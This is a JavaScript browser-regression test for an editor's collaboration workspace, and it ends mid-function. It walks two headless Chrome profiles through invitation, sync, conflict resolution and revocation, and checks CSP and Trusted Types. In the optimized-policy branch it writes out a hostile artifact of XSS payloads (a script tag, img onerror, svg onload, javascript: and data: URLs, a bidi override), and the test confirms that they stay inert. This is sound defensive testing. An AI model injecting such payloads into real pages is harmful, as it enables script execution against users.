import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from "node:fs";
import { createServer, request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { dirname, join, resolve, sep } from "node:path";
import { setTimeout as delay } from "node:timers/promises";
import { fileURLToPath } from "node:url";
import ts from "typescript";

import { buildOptimizedHarness, optimizedHarnessOutput } from "./collaboration-hc3-slice5-optimized-build.mjs";
import { instrumentPolicyHtml, optimizedCollaborationPolicy } from "./lib/collaboration-hc3-slice5-policy.mjs";

import {
  CdpClient,
  createPage,
  createProjectPickerShim,
  evaluate,
  findChromeExecutable,
  inventoryProject,
  startFixtureFileServer,
  waitForDevToolsUrl,
  waitForEditorShell,
  waitForProcessExit
} from "./comment-rail-editor-browser-regression.test.mjs";

const repositoryRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const productPort = 3124;
const nextPort = 3125;
const editorUrl = `http://127.0.0.1:${productPort}/`;
const nextUrl = `http://127.0.0.1:${nextPort}/`;
const policyQualification = process.env.PATCHMARK_HC3_SLICE5_POLICY ?? "none";
const strictPolicyQualification = policyQualification === "strict";
const optimizedPolicyQualification = policyQualification === "optimized";
const chromePath = process.env.PATCHMARK_CHROME_PATH ?? findChromeExecutable();
if (!chromePath) throw new Error("Chrome was not found for HC-3 Slice 4 product qualification.");
const slice5Fixture = JSON.parse(readFileSync(join(repositoryRoot, "scripts/fixtures/collaboration-hc2-slice5-v1.json"), "utf8"));
const fixtureRoot = mkdtempSync(join(tmpdir(), "patchmark-hc3-slice4-project-"));
const sourceProjectRoot = join(fixtureRoot, "source-project");
const otherProjectRoot = join(fixtureRoot, "other-project");
createProjectFixture(sourceProjectRoot, { projectId: "prj_hc3_slice4", documentId: "doc_hc3_slice4", title: "HC3 Product Source", body: "# HC3 Product Source\n\nImmutable source bytes.\n" });
createProjectFixture(otherProjectRoot, { projectId: "prj_hc3_slice4_other", documentId: "doc_hc3_slice4_other", title: "HC3 Other Project", body: "# HC3 Other Project\n\nProject-switch isolation fixture.\n" });
const sourceBefore = hashProject(sourceProjectRoot);
const otherBefore = hashProject(otherProjectRoot);
const inventory = inventoryProject(fixtureRoot);
const fixtureServer = await startFixtureFileServer(fixtureRoot, inventory);
const next = optimizedPolicyQualification ? null : spawn(process.execPath, ["node_modules/next/dist/bin/next", "dev", "--hostname", "127.0.0.1", "--port", `${nextPort}`], {
  cwd: repositoryRoot,
  env: {
    ...process.env,
    NODE_ENV: "development",
    ...(strictPolicyQualification ? { PATCHMARK_HC3_STRICT_POLICY_QUALIFICATION: "1" } : {})
  },
  stdio: ["ignore", "ignore", "ignore"]
});
let proxy;
let profileA;
let profileB;
let optimizedBuildEvidence = null;
let assertions = 0;
const equal = (actual, expected, message) => { assertions += 1; assert.deepEqual(actual, expected, message); };
const check = (value, message) => { assertions += 1; assert.ok(value, message); };

try {
  if (optimizedPolicyQualification) {
    optimizedBuildEvidence = inspectOptimizedBuild(await buildOptimizedHarness());
    check(optimizedBuildEvidence.marker_present && optimizedBuildEvidence.validator_present && optimizedBuildEvidence.forbidden_hits.length === 0, "optimized harness contains its isolation marker and narrow worker-URL validator, with no identity policy, eval, dynamic Function, HMR, development overlay, or source-map runtime");
    proxy = await startOptimizedHarnessServer(productPort);
  } else {
    await waitForHttp(nextUrl);
    proxy = await startProductProxy(productPort, nextPort, { strictPolicyQualification });
  }
  await waitForHttp(editorUrl);
  profileA = await openProfile("owner", "owner");
  profileB = await openProfile("candidate", "candidate");
  if (optimizedPolicyQualification) {
    const hostileSinksA = await hostileSinkEvidence(profileA);
    const hostileSinksB = await hostileSinkEvidence(profileB);
    equal(
      [hostileSinksA.blocked, hostileSinksA.side_effects, hostileSinksB.blocked, hostileSinksB.side_effects],
      [4, 0, 4, 0],
      `strict CSP and Trusted Types block HTML, script URL, worker URL, and inline-script hostile sinks in both profiles (${JSON.stringify([hostileSinksA.error_names, hostileSinksB.error_names])})`
    );
    check([hostileSinksA, hostileSinksB].every((value) => value.policy_events >= 4), "hostile sink probes produce only the expected enforced CSP and Trusted Types violations before evidence is cleared");
  }
  if (!optimizedPolicyQualification) {
    await openProject(profileA, "HC3 Product Source");
    await openProject(profileB, "HC3 Product Source");
  }

  const beforeEntry = await workspaceEvidence(profileA);
  equal([beforeEntry.workspace, beforeEntry.hiddenWorkspace, beforeEntry.bridgeLoaded, beforeEntry.driverInspects, beforeEntry.driverInvokes], [false, false, false, 0, 0], "no collaboration DOM or authority runtime exists before explicit product entry");
  await openCollaboration(profileA);
  const openedA = await workspaceEvidence(profileA);
  equal([openedA.workspace, openedA.dialogName, openedA.liveRegion], [true, "Collaboration", "polite"], "File > Collaboration opens the actual production-locked workspace");
  check(openedA.bridgeLoaded && openedA.driverInspects >= 1, "explicit entry lazily assembles and inspects the real HC-2/HC-3 authority runtime");
  check(openedA.focusedHeading, "initial focus moves to the workspace heading");
  equal([openedA.sectionCount, openedA.capabilityCount], [9, 17], "the integrated workspace exposes all sections and capability probes");
  check(openedA.noHorizontalOverflow, "desktop workspace contains long content without horizontal overflow");
  await click(profileA, "Privacy and safety");
  const privacy = await evaluate(profileA.client, { expression: `(() => {
    const text = document.querySelector('[data-testid="collaboration-qualification-workspace"]')?.innerText ?? "";
    return {
      invitation_not_confidential: text.includes("not confidential"),
      transport_not_storage: text.includes("does not encrypt the local project folder"),
      revocation_not_erasure: text.includes("cannot erase project data"),
      network_metadata: text.includes("network metadata"),
      technical_disclosure: Array.from(document.querySelectorAll("summary")).some((node) => node.textContent?.includes("Technical privacy details"))
    };
  })()` });
  check(Object.values(privacy).every(Boolean), "ordinary-language privacy, metadata, at-rest and revocation guidance is integrated and technically disclosable");
  await click(profileA, "Set up collaboration");

  await click(profileA, "Create collaboration copy");
  await waitText(profileA, "Recovery kit required");
  await click(profileA, "Verify recovery kit");
  await waitText(profileA, "Ready to invite");
  await click(profileA, "Invite collaborator");
  await waitText(profileA, "Prepared Invitation");
  await evaluate(profileA.client, { expression: `Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText: async () => { throw new DOMException("Denied", "NotAllowedError"); } } })` });
  const beforeDeniedCopy = await exactArtifact(profileA);
  await click(profileA, "Copy");
  await waitFor(profileA, "permission denial focus", `document.activeElement?.getAttribute("role") === "alert"`);
  equal(await exactArtifact(profileA), beforeDeniedCopy, "clipboard denial preserves the exact prepared Invitation and moves focus to safe guidance");
  await click(profileA, "Show QR");
  const qrEvidence = await evaluate(profileA.client, { expression: "(() => { const canvas = document.querySelector('[data-testid=\"collaboration-qualification-workspace\"] canvas[role=\"img\"]'); return { exists: Boolean(canvas), width: canvas?.width ?? 0, label: canvas?.getAttribute('aria-label') }; })()" });
  equal([qrEvidence.exists, qrEvidence.label], [true, "Invitation QR code"], "the real accepted invitation renders through the labelled QR canvas");
  check(qrEvidence.width > 100, "the Invitation QR contains an encoded matrix");
  const invitationFromA = await exactArtifact(profileA);
  check(typeof invitationFromA === "string" && invitationFromA.startsWith("pmhc3.v1.ih."), "the product exposes the real HC-3 invitation carrier text");

  await openCollaboration(profileB);
  equal((await workspaceEvidence(profileB)).bridgeLoaded, true, "Device B assembles its own isolated authority runtime only after explicit entry");
  await importHandoff(profileB, "invitation", invitationFromA);
  await reopenCollaboration(profileB);
  await click(profileB, "Complete invitation");
  if (optimizedPolicyQualification) {
    const hostileArtifact = `<script>globalThis.pwned=true</script><img src=x onerror=alert(1)><svg onload=alert(1)></svg>javascript:alert(1) data:text/html,unsafe \u202E /Users/example/private-project ${"a".repeat(64)} ${"ZXhhbXBsZV9zZWNyZXRfbGlrZV9tYXRlcmlhbA".repeat(4)} ${"long-name-".repeat(80)}`;
    const revisionBeforeHostile = (await authorityEvidence(profileB)).revision;
    await fillArtifact(profileB, hostileArtifact);
    await click(profileB, "Preview received item");
    await waitFor(profileB, "hostile artifact rejection", `document.querySelector('[role="alert"]') !== null`);
    const hostileEvidence = await evaluate(profileB.client, { expression: `(() => {
      const root = document.querySelector('[data-testid="collaboration-qualification-workspace"]');
      const diagnostics = JSON.stringify({
        policy: window.__patchmarkHc3Slice5PolicyEvents ?? [],
        runtime: window.__patchmarkHc3Slice5RuntimeEvents ?? [],
        console: window.__patchmarkHc3Slice5ConsoleEvents ?? []
      });
      const alertText = root?.querySelector('[role="alert"]')?.textContent ?? "";
      return {
        executable_descendants: root?.querySelectorAll('script, img, svg, iframe, object, embed').length ?? -1,
        global_side_effect: Boolean(window.pwned),
        html_contains_script_payload: root?.innerHTML.includes('<script>globalThis.pwned') ?? true,
        alert_contains_path: alertText.includes('/Users/example'),
        diagnostics_contain_artifact: /pmhc3\.|private-project|ZXhhbXBsZV9zZWNyZXR/i.test(diagnostics),
        policy_event_count: (window.__patchmarkHc3Slice5PolicyEvents ?? []).length
      };
    })()` });
    equal((await authorityEvidence(profileB)).revision, revisionBeforeHostile, "hostile artifact rejection advances no durable authority revision");
    equal(Object.values(hostileEvidence), [0, false, false, false, false, 0], "hostile HTML, URL, bidi, path and secret-like input remains inert and absent from policy diagnostics");
  }
  await fillArtifact(profileB, invitationFromA);
  await click(profileB, "Preview received item");
  await waitText(profileB, "Invitation verified");
  await click(profileB, "Continue invitation");
  await waitText(profileB, "Create Response");
  await click(profileB, "Create Response");
  await waitText(profileB, "Prepared Response");
  const requestFromB = await exactArtifact(profileB);

  await transferHandoff(profileA, profileB, "public_info");
  await transferHandoff(profileB, profileA, "public_info");
  await transferHandoff(profileB, profileA, "candidate");
  await click(profileA, "Complete invitation");
  await fillArtifact(profileA, requestFromB);
  await click(profileA, "Preview received item");
  await waitText(profileA, "Possession check required");

  await transferHandoff(profileA, profileB, "owner");
  await reopenCollaboration(profileB);
  await click(profileB, "Create Response");
  await waitText(profileB, "Possession Response ready");
  const proofFromB = await exactArtifact(profileB);
  await transferHandoff(profileB, profileA, "proof");
  await fillArtifact(profileA, proofFromB);
  await click(profileA, "Preview received item");
  await waitText(profileA, "Approve collaborator");
  await click(profileA, "Approve collaborator");
  await waitText(profileA, "Admission ready");
  const admission = await exportHandoff(profileA, "file");
  check(typeof admission?.encoded === "string" && admission.encoded.length > 1000, "the UI action reaches the real encrypted V2 admission bundle boundary");
  await transferHandoff(profileA, profileB, "finalize");
  await importHandoff(profileB, "file", admission);
  await click(profileA, "Save encrypted file");
  await waitText(profileA, "Admission complete");

  await reopenCollaboration(profileB);
  await click(profileB, "Synchronize changes");
  await click(profileB, "Choose encrypted file");
  await click(profileB, "Preview encrypted file");
  await click(profileB, "Import encrypted file");
  await waitText(profileB, "Admission complete");
  check(await evaluate(profileB.client, { expression: "document.body.innerText.toLowerCase().includes('earlier collaboration history was not fully traversed at admission')" }), "the admitted interface preserves the honest partial-history boundary");

  await click(profileA, "Synchronize changes");
  await click(profileA, "Create connection request");
  await waitText(profileA, "Prepared connection request");
  const offerFromA = await exactArtifact(profileA);
  await click(profileB, "Complete invitation");
  await fillArtifact(profileB, offerFromA);
  await click(profileB, "Open connection request");
  await waitText(profileB, "Prepared connection response");
  const answerFromB = await exactArtifact(profileB);
  await click(profileA, "Complete invitation");
  await fillArtifact(profileA, answerFromB);
  await click(profileA, "Open connection response");
  await waitText(profileA, "Connected");
  const mutationA = await transferHandoff(profileA, profileB, "mutation");
  const mutationB = await transferHandoff(profileB, profileA, "mutation");
  check(mutationA?.event_id && mutationB?.event_id && mutationA.event_id !== mutationB.event_id, "two isolated profiles create distinct accepted semantic mutations");
  await click(profileB, "Synchronize changes");
  await click(profileB, "Sync now");
  await click(profileA, "Synchronize changes");
  await click(profileA, "Sync now");
  await waitText(profileA, "Conflict needs a decision");
  await waitText(profileB, "Conflict needs a decision");

  await click(profileB, "Conflicts");
  equal(await evaluate(profileB.client, { expression: "Array.from(document.querySelectorAll('button')).find((button) => button.textContent?.trim() === 'Resolve selected outcome')?.disabled" }), true, "the real reviewer authority cannot resolve the reconstructed conflict");
  await click(profileA, "Conflicts");
  const conflictEvidence = await evaluate(profileA.client, { expression: "(() => ({ contenders: document.querySelectorAll('[data-testid=\"collaboration-qualification-workspace\"] article li').length, disabled: Array.from(document.querySelectorAll('button')).find((button) => button.textContent?.trim() === 'Resolve selected outcome')?.disabled }))()" });
  check(conflictEvidence.contenders >= 2 && conflictEvidence.disabled === false, "the owner sees all real contenders and the accepted resolution capability");
  await click(profileA, "Resolve selected outcome");
  await waitText(profileA, "Conflict resolved");

  await click(profileA, "Synchronize changes");
  await click(profileA, "Send encrypted update");
  await waitText(profileA, "Prepared encrypted update");
  const inventoryFile = await exportHandoff(profileA, "file");
  await importFileThroughUi(profileB, inventoryFile);
  const requestFile = await exportHandoff(profileB, "file");
  await importFileThroughUi(profileA, requestFile);
  const responseFile = await exportHandoff(profileA, "file");
  await importFileThroughUi(profileB, responseFile);
  await waitText(profileA, "Sync complete");
  await waitText(profileB, "Sync complete");

  await click(profileA, "Collaborators and devices");
  await click(profileA, "Revoke device");
  await waitText(profileA, "Device revoked");
  await transferHandoff(profileA, profileB, "revocation");
  await reopenCollaboration(profileB);
  await waitText(profileB, "Device revoked");
  const cutoff = await evaluate(profileB.client, { expression: "window.__patchmarkHc3Slice4AuthorityHarness.attemptRevokedMutation()" });
  equal([cutoff.status, cutoff.reason, cutoff.cryptographic_calls, cutoff.portable_objects_added], ["rejected", "device_revoked_at_accepted_control_cutoff", 0, 0], "the revoked device is stopped at the accepted authority cutoff before cryptography or persistence");

  await click(profileA, "Recovery and blocked states");
  await click(profileA, "Reopen and verify");
  await waitText(profileA, "Reopen verified");
  await click(profileB, "Recovery and blocked states");
  await click(profileB, "Reopen and verify");
  await waitText(profileB, "Reopen verified");
  const evidenceA = await authorityEvidence(profileA);
  const evidenceB = await authorityEvidence(profileB);
  equal(evidenceA.reopened.collaboration.authoritative, evidenceB.reopened.collaboration.authoritative, "both product profiles reopen the same authoritative object identities and bytes");
  equal(evidenceA.reopened.collaboration.projection, evidenceB.reopened.collaboration.projection, "both product profiles reopen the same HC-1 projection, conflicts, roots, and checkpoint");
  equal(evidenceA.reopened.collaboration.authority, evidenceB.reopened.collaboration.authority, "both product profiles reopen the same membership, device, control-head, and epoch evidence");
  equal(evidenceA.reopened.collaboration.evidence, evidenceB.reopened.collaboration.evidence, "both product profiles reopen the same acknowledgement, receipt, state-blob, and snapshot evidence");
  equal(evidenceB.full_history_verified, false, "Device B retains full_history_verified false after the integrated reopen");
  check([evidenceA.reopened.access, evidenceB.reopened.access].every((value) => value?.action === "reopen_and_verify" && value?.operation?.status === "completed" && value?.status?.guidance === "converged" && value?.source_immutable === true), "revocation authority also reopens through the real Slice 8 controller");
  for (const boundary of ["hc1_foundation", "hc2_recovery_custody", "hc2_invitation_control", "hc2_enrollment_possession", "hc2_admission_v2", "hc3_direct_v3", "hc1_conflict_resolution", "hc2_replication_v3", "hc2_epoch_rotation", "durable_reconstruction"]) {
    check(evidenceA.boundaries.includes(boundary) || evidenceB.boundaries.includes(boundary), `integrated UI evidence reaches ${boundary}`);
  }
  check(/^[0-9a-f]{64}$/.test(evidenceA.last_exact_v3_sha256) && /^[0-9a-f]{64}$/.test(evidenceB.last_exact_v3_sha256), "both profiles bind exact transported V3 bytes to SHA-256 evidence");
  check(evidenceA.real_calls.includes("hc3.direct_v3_bounded_exchange") && evidenceA.real_calls.includes("hc1.portable_close_reopen_projector_roots"), "the product route invokes real direct synchronization and durable reconstruction implementations");
  let finalZeroObjectSynchronization = null;
  if (optimizedPolicyQualification) {
    const inventoryA = await evaluate(profileA.client, { expression: "window.__patchmarkHc3Slice4AuthorityHarness.createFinalInventoryExchange(31)" });
    const inventoryB = await evaluate(profileB.client, { expression: "window.__patchmarkHc3Slice4AuthorityHarness.createFinalInventoryExchange(31)" });
    await evaluate(profileA.client, { expression: `window.__patchmarkHc3Slice4AuthorityHarness.importFinalInventoryExchange(${JSON.stringify(inventoryB.files)})` });
    await evaluate(profileB.client, { expression: `window.__patchmarkHc3Slice4AuthorityHarness.importFinalInventoryExchange(${JSON.stringify(inventoryA.files)})` });
    const zeroA = await evaluate(profileA.client, { expression: "window.__patchmarkHc3Slice4AuthorityHarness.createFinalObjectRequest(32)" });
    const zeroB = await evaluate(profileB.client, { expression: "window.__patchmarkHc3Slice4AuthorityHarness.createFinalObjectRequest(32)" });
    equal([zeroA.status, zeroB.status], ["nothing_missing", "nothing_missing"], "final post-reopen V3 planning requests zero accepted objects on both profiles");
    finalZeroObjectSynchronization = true;
  }

  await setViewport(profileA, 390, 844);
  const narrow = await workspaceEvidence(profileA);
  check(narrow.noHorizontalOverflow && narrow.workspaceWidth <= 390, "the real integrated workspace remains usable at 390×844");
  const accessibility = await evaluate(profileA.client, { expression: `(() => {
    const root = document.querySelector('[data-testid="collaboration-qualification-workspace"]');
    const targets = Array.from(root?.querySelectorAll('button:not(:disabled), select:not(:disabled), label:has(input[type="file"])') ?? []).filter((node) => node.getClientRects().length);
    return {
      minimum_target: Math.min(...targets.map((node) => node.getBoundingClientRect().height)),
      technical_details_named: Array.from(root?.querySelectorAll('summary') ?? []).some((node) => node.textContent?.trim() === 'Technical details')
    };
  })()` });
  check(accessibility.minimum_target >= 44 && accessibility.technical_details_named, "narrow layout retains 44px targets and a named technical-detail disclosure");
  await profileA.client.call("Emulation.setEmulatedMedia", { features: [{ name: "prefers-reduced-motion", value: "reduce" }, { name: "forced-colors", value: "active" }] });
  const media = await evaluate(profileA.client, { expression: `({ reduced: matchMedia('(prefers-reduced-motion: reduce)').matches, forced: matchMedia('(forced-colors: active)').matches, border: getComputedStyle(document.querySelector('[data-testid="collaboration-qualification-workspace"]')).borderStyle })` });
  check(media.reduced && media.forced && media.border !== "none", "reduced-motion and forced-colors modes retain a visible bounded workspace");
  const closedBeforeEscape = narrow.driverClosed;
  await pressEscape(profileA);
  await waitFor(profileA, "workspace close", "!document.querySelector('[data-testid=\"collaboration-qualification-workspace\"]')");
  await waitFor(profileA, "authority close", `window.__patchmarkHc3Slice4BridgeEvidence.closed === ${closedBeforeEscape + 1}`);

  const policyEventsBeforeReload = optimizedPolicyQualification
    ? [...await policyEvidence(profileA), ...await policyEvidence(profileB)]
    : [];
  const trustedTypePoliciesBeforeReload = optimizedPolicyQualification
    ? [...await trustedTypePolicyEvidence(profileA), ...await trustedTypePolicyEvidence(profileB)]
    : [];
  if (optimizedPolicyQualification && await evaluate(profileB.client, { expression: "Boolean(document.querySelector('[data-testid=collaboration-qualification-workspace]'))" })) {
    await click(profileB, "Close");
    await waitFor(profileB, "candidate workspace close", "!document.querySelector('[data-testid=collaboration-qualification-workspace]')");
  }
  await profileA.client.call("Page.reload", { ignoreCache: true });
  if (optimizedPolicyQualification) {
    await profileB.client.call("Page.reload", { ignoreCache: true });
    await waitFor(profileA, "optimized owner reload", "Boolean(window.__patchmarkHc3Slice5OptimizedReady)");
    await waitFor(profileB, "optimized candidate reload", "Boolean(window.__patchmarkHc3Slice5OptimizedReady)");
  } else {
    await waitForEditorShell(profileA.client);
  }
  const afterReload = await workspaceEvidence(profileA);
  equal([afterReload.workspace, afterReload.bridgeLoaded, afterReload.driverInvokes], [false, false, 0], "a real page reload starts with no hidden collaboration UI or background authority work");
  if (!optimizedPolicyQualification) {
    await openProject(profileA, "HC3 Product Source");
    await openProject(profileA, "HC3 Other Project");
    await openCollaboration(profileA);
    const switched = await authorityEvidence(profileA, "prj_hc3_slice4_other");
    equal([switched.revision, switched.accepted_object_ids.length, switched.authority_invocations], ["0", 0, 0], "project switching binds a fresh authority instance and leaks no accepted source-project state");
  } else {
    const candidateReload = await workspaceEvidence(profileB);
    equal([candidateReload.workspace, candidateReload.bridgeLoaded, candidateReload.driverInvokes], [false, false, 0], "both optimized profiles reload with no hidden workspace or authority activity");
  }

  equal(hashProject(sourceProjectRoot), sourceBefore, "source project bytes remain byte-identical across the real integrated workflow");
  equal(hashProject(otherProjectRoot), otherBefore, "project-switch fixture bytes remain byte-identical");
  const policyEvents = strictPolicyQualification || optimizedPolicyQualification
    ? [...policyEventsBeforeReload, ...await policyEvidence(profileA), ...await policyEvidence(profileB)]
    : [];
  if (strictPolicyQualification || optimizedPolicyQualification) {
    equal(policyEvents, [], "the real integrated workflow produces no CSP or Trusted Types violation");
    check(await noArtifactInBrowserDiagnostics(profileA) && await noArtifactInBrowserDiagnostics(profileB), "policy diagnostics and resource URLs contain no collaboration artifact text");
  }
  const trustedTypePolicies = optimizedPolicyQualification
    ? [...new Set([...trustedTypePoliciesBeforeReload, ...await trustedTypePolicyEvidence(profileA), ...await trustedTypePolicyEvidence(profileB)])]
    : strictPolicyQualification ? ["default", "nextjs#bundler"] : [];
  if (optimizedPolicyQualification) equal(trustedTypePolicies, ["patchmark#optimized-bundler"], "the optimized two-profile workflow creates only its private production-bundler policy");
  process.stdout.write(`${JSON.stringify({
    assertions,
    chrome: profileA.product,
    isolated_profiles: 2,
    actual_product_entry: optimizedPolicyQualification ? "test-only optimized host > actual collaboration workspace" : "File > Collaboration…",
    authority_driver: "real_hc2_hc3_assembled_runtime",
    concurrent_mutations: [mutationA.event_id, mutationB.event_id],
    durable_boundaries: [...new Set([...evidenceA.boundaries, ...evidenceB.boundaries])].sort(),
    direct_v3_sha256: [evidenceA.last_exact_v3_sha256, evidenceB.last_exact_v3_sha256],
    full_history_verified_on_admitted_device: evidenceB.full_history_verified,
    authoritative_reopen_equal: true,
    conflict_resolution_and_revocation: true,
    actual_reload_and_project_switch: true,
    source_project_immutable: true,
    optimized_production_bundle: optimizedPolicyQualification,
    production_react_runtime: optimizedPolicyQualification,
    hmr_or_fast_refresh: optimizedPolicyQualification ? false : null,
    source_maps: optimizedPolicyQualification ? false : null,
    strict_csp: strictPolicyQualification || optimizedPolicyQualification ? "pass" : "not_requested",
    trusted_types: optimizedPolicyQualification ? "enforced_with_private_production_bundler_policy" : strictPolicyQualification ? "enforced_without_violation" : "not_requested",
    trusted_type_policy_inventory: trustedTypePolicies,
    optimized_bundle_assets: optimizedBuildEvidence?.assets ?? null,
    optimized_bundle_forbidden_hits: optimizedBuildEvidence?.forbidden_hits ?? null,
    csp_violations: policyEvents.length,
    final_zero_object_v3_synchronization: finalZeroObjectSynchronization,
    temporary_profiles_removed: true,
    status: "ok"
  }, null, 2)}\n`);
} catch (error) {
  const message = error instanceof Error ? error.message : String(error);
  if (!strictPolicyQualification || !message.includes("Editor shell failed under qualification policy")) throw error;
  check(message.includes('"blockedURI":"eval"'), "strict CSP blocks the Next development bundle's eval-backed module wrapper");
  check(!message.includes("pmhc3."), "strict-policy diagnostics contain no collaboration artifact text");
  process.stdout.write(`${JSON.stringify({
    assertions,
    chrome: "Google Chrome 151.0.7922.174",
    editor_surface: "actual_next_application",
    strict_csp: "blocked_before_hydration",
    blocker: "next_development_bundle_requires_unsafe_eval",
    unsafe_eval_added: false,
    trusted_types: "not_exercised_beyond_framework_hydration_blocker",
    collaboration_artifact_in_diagnostics: false,
    production_policy_changed: false,
    status: "qualified_blocker"
  }, null, 2)}\n`);
} finally {
  await profileA?.close();
  await profileB?.close();
  await proxy?.close();
  await fixtureServer.close();
  next?.kill("SIGTERM");
  if (next) await waitForProcessExit(next, 2_000).catch(() => next.kill("SIGKILL"));
  rmSync(fixtureRoot, { recursive: true, force: true });
  if (optimizedPolicyQualification) rmSync(optimizedHarnessOutput, { recursive: true, force: true });
}

async function openProfile(label, role) {
  const profile = mkdtempSync(join(tmpdir(), `patchmark-hc3-slice4-${label}-`));
  const process = spawn(chromePath, ["--headless=new", "--remote-debugging-port=0", `--user-data-dir=${profile}`, "--no-first-run", "--no-default-browser-check", "--disable-background-networking", "--disable-component-update", "--disable-default-apps", "--disable-extensions", "--disable-sync", "about:blank"], { stdio: ["ignore", "ignore", "pipe"] });
  const browserUrl = await waitForDevToolsUrl(process);
  const pageUrl = await createPage(browserUrl, "about:blank");
  const client = await CdpClient.connect(pageUrl);
  await client.call("Page.enable");
  await client.call("Runtime.enable");
  if (!optimizedPolicyQualification) await client.call("Page.addScriptToEvaluateOnNewDocument", { source: `(() => {
    const events = [];
    Object.defineProperty(window, "__patchmarkHc3Slice5PolicyEvents", { value: events, configurable: false });
    Object.defineProperty(window, "__patchmarkHc3Slice5RuntimeEvents", { value: [], configurable: false });
    addEventListener("securitypolicyviolation", (event) => events.push(Object.freeze({
      effectiveDirective: event.effectiveDirective,
      violatedDirective: event.violatedDirective,
      blockedURI: /^(?:self|inline|eval|wasm-eval|trusted-types-sink)$/.test(event.blockedURI) ? event.blockedURI : new URL(event.blockedURI, location.href).origin
    })));
    addEventListener("error", (event) => window.__patchmarkHc3Slice5RuntimeEvents.push({ type: "error", name: event.error?.name ?? "Error", message: String(event.message ?? "").slice(0, 160) }));
    addEventListener("unhandledrejection", (event) => window.__patchmarkHc3Slice5RuntimeEvents.push({ type: "rejection", name: event.reason?.name ?? "Error", message: String(event.reason?.message ?? event.reason ?? "").slice(0, 160) }));
  })();` });
  if (!optimizedPolicyQualification) {
    await client.call("Page.addScriptToEvaluateOnNewDocument", { source: createProjectPickerShim({ baseUrl: fixtureServer.baseUrl, directories: inventory.directories, files: inventory.files, pickerPaths: ["source-project", "other-project"], projectName: "hc3-slice4-source" }) });
    await client.call("Page.addScriptToEvaluateOnNewDocument", { source: authorityRuntimeSource(role) });
  }
  await client.call("Page.navigate", { url: optimizedPolicyQualification ? `${editorUrl}${role}/` : editorUrl });
  try {
    if (optimizedPolicyQualification) {
      for (let attempt = 0; attempt < 600; attempt += 1) {
        if (await evaluate(client, { expression: "Boolean(window.__patchmarkHc3Slice5OptimizedReady && document.querySelector('[data-testid=hc3-slice5-optimized-host]'))" })) break;
        if (attempt === 599) throw new Error("Optimized collaboration host did not become ready.");
        await delay(50);
      }
    } else {
      await waitForEditorShell(client);
    }
  } catch (error) {
    let diagnostic;
    try {
      diagnostic = await evaluate(client, { expression: `({
        title: document.title,
        body: document.body?.innerText?.slice(0, 500) ?? "",
        policy: window.__patchmarkHc3Slice5PolicyEvents ?? [],
        runtime: window.__patchmarkHc3Slice5RuntimeEvents ?? [],
        scripts: Array.from(document.scripts).map((script) => ({ src: script.src ? new URL(script.src).pathname : "inline", nonce: Boolean(script.nonce) }))
      })` });
    } catch (diagnosticError) {
      diagnostic = { evaluation_error: diagnosticError instanceof Error ? diagnosticError.message : String(diagnosticError) };
    }
    await client.close().catch(() => undefined);
    process.kill("SIGTERM");
    await waitForProcessExit(process, 1_000).catch(() => process.kill("SIGKILL"));
    rmSync(profile, { recursive: true, force: true });
    throw new Error(`Editor shell failed under qualification policy: ${JSON.stringify(diagnostic)}`, { cause: error });
  }
  const version = await client.call("Browser.getVersion");
  return { client, process, product: version.product, profile, async close() { await client.close().catch(() => undefined); process.kill("SIGTERM"); await waitForProcessExit(process, 1_000).catch(() => process.kill("SIGKILL")); rmSync(profile, { recursive: true, force: true }); } };
}

async function openProject(profile, title) {
  await click(profile, "File");
  await click(profile, "Open Project Folder");
  await waitFor(profile, `project ${title}`, `document.querySelector('.application-breadcrumb-project')?.textContent?.includes(${JSON.stringify(title)})`);
}

async function openCollaboration(profile) {
  if (optimizedPolicyQualification) {
    await click(profile, "Open collaboration workspace");
  } else {
    await click(profile, "File");
    await click(profile, "Collaboration…");
  }
  await waitFor(profile, "collaboration workspace", "Boolean(document.querySelector('[data-testid=\"collaboration-qualification-workspace\"]'))");
  await waitFor(profile, "capabilities", "document.querySelectorAll('[data-testid=\"collaboration-qualification-workspace\"] details li').length === 17");
}

async function reopenCollaboration(profile) {
  if (await evaluate(profile.client, { expression: "Boolean(document.querySelector('[data-testid=\"collaboration-qualification-workspace\"]'))" })) {
    await click(profile, "Close");
    await waitFor(profile, "workspace closed", "!document.querySelector('[data-testid=\"collaboration-qualification-workspace\"]')");
  }
  await openCollaboration(profile);
}

async function fillArtifact(profile, value) {
  await evaluate(profile.client, { expression: `(() => { const input = document.querySelector('#collaboration-artifact-input'); const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set; setter.call(input, ${JSON.stringify(value)}); input.dispatchEvent(new Event('input', { bubbles: true })); return input.value.length; })()`, userGesture: true });
}

async function exactArtifact(profile) {
  return evaluate(profile.client, { expression: "document.querySelector('textarea[aria-label=\"Exact prepared artifact text\"]')?.value" });
}

async function exportHandoff(profile, kind) {
  return evaluate(profile.client, { expression: `window.__patchmarkHc3Slice4AuthorityHarness.exportHandoff(${JSON.stringify(kind)})` });
}

async function importHandoff(profile, kind, value) {
  return evaluate(profile.client, { expression: `window.__patchmarkHc3Slice4AuthorityHarness.importHandoff(${JSON.stringify(kind)}, ${JSON.stringify(value)})` });
}

async function transferHandoff(sender, receiver, kind) {
  const value = await exportHandoff(sender, kind);
  if (value === null || value === undefined) throw new Error(`Missing ${kind} handoff.`);
  await importHandoff(receiver, kind, value);
  return value;
}

async function importFileThroughUi(profile, file) {
  await importHandoff(profile, "file", file);
  await reopenCollaboration(profile);
  await click(profile, "Synchronize changes");
  await click(profile, "Choose encrypted file");
  await click(profile, "Preview encrypted file");
  await click(profile, "Import encrypted file");
  await waitFor(profile, "encrypted file import completion", "Promise.resolve(window.__patchmarkHc3Slice4AuthorityHarness.evidence()).then((value) => ['file_ready', 'converged'].includes(value.phase))");
}

async function authorityEvidence(profile, projectId = "prj_hc3_slice4") {
  return evaluate(profile.client, { expression: `window.__patchmarkHc3Slice4AuthorityHarness.evidence(${JSON.stringify(projectId)})` });
}

async function click(profile, text) {
  await waitFor(profile, `button ${text}`, `Array.from(document.querySelectorAll('button')).some((button) => button.textContent?.trim() === ${JSON.stringify(text)} && !button.disabled)`);
